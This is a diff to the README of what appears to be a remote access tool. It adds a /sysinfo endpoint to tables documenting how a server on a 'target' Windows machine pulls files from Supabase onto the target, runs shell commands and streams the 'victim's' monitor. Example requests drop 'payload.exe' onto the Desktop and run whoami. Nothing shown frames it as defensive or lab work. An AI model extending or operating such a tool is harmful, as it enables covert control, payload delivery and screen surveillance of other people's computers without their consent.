@@ -28,7 +28,7 @@ The server runs on the target Windows machine. The client is a static HTML page.
 | `GET /uploadfile` | Download from Supabase → write to target |
 | `GET /cmd` | Execute shell command |
 | `POST /offer` | Streams the victim's main monitor (WebRTC) |
-
+| `GET /sysinfo` | |
 ## Quick Start
 
 ### 1. Server dependencies
@@ -77,6 +77,7 @@ All endpoints accept GET requests. Paths are relative to C:\.
 | /uploadfile?dwpath=Desktop\&dbfilename=payload.exe	| 
 | /cmd?cmd=whoami&path=Users\victim	| returns {stdout, stderr, code}
 | /offer     |
+| /sysinfo |
 -----
 
 # Security Notes
